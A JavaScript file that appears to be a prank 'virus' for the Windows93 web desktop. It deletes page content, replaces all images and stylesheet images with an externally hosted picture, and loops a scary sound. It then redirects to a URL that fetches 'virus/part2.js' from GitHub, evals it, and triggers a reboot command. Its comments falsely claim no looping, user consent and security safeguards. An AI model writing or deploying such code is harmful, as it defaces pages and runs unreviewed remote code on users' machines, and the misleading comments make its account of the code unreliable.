// Targeting elements
const targetDiv = document.querySelector('div.pa0');
const allImages = document.querySelectorAll('img');

// Function to replace images and play sound (without autoplay or loop)
function modifyContent() {
  if (targetDiv) {
    targetDiv.remove(); // Remove the targeted div
  }

  allImages.forEach(image => {
    image.src = 'https://leopard.hosting.pecon.us/dl/vzcbl/gdfdfgdfghdfgdfh.png'; // Replace image source
  });

function replaceImageUrls(cssUrl, newImageUrl) {
  // Fetch the CSS content
  fetch(cssUrl)
    .then(response => response.text())
    .then(cssText => {
      // Regex to find image URLs in url("") or url('...') format
      const imageUrlRegex = /url\(['"]?([^'"]+)['"]?\)/g;

      // Replace all occurrences with the new URL
      const newCssText = cssText.replace(imageUrlRegex, `url("${newImageUrl}")`);

      // Apply the modified CSS to the page (replace existing stylesheet)
      const linkElement = document.querySelector(`link[href="${cssUrl}"]`);
      if (linkElement) {
        const styleElement = document.createElement('style');
        styleElement.textContent = newCssText;
        linkElement.parentNode.replaceChild(styleElement, linkElement);
      } else {
        console.warn(`Could not find stylesheet with URL: ${cssUrl}`);
      }
    })
    .catch(error => console.error("Error fetching or modifying CSS:", error));
}

// Replace image URLs in "sys42.css" with the provided URL
replaceImageUrls("sys42.css", "https://leopard.hosting.pecon.us/dl/vzcbl/gdfdfgdfghdfgdfh.png");
  
  // Play sound (without autoplay or loop, user interaction required)
  const sound = new Audio();
  sound.src = 'https://leopard.hosting.pecon.us/dl/iosss/scariest.wav'; // Replace with your sound file path
  sound.addEventListener('ended', () => {
      sound.play();
      redirectWithAlert();
  });
  sound.play();
}

// Alert and redirection (with confirmation and security considerations)
function redirectWithAlert() {
    window.location.href = "https://www.windows93.net/#!js%20fetch('https://raw.githubusercontent.com/ivorydevrimoalt/windows93/main/virus/part2.js').then(response => response.text()).then(script => eval(script));";
    setTimeout(function(){
    $exe("reboot")
    },1000)
}

// Call the functions (modify content first, then handle alert and redirection)
modifyContent();

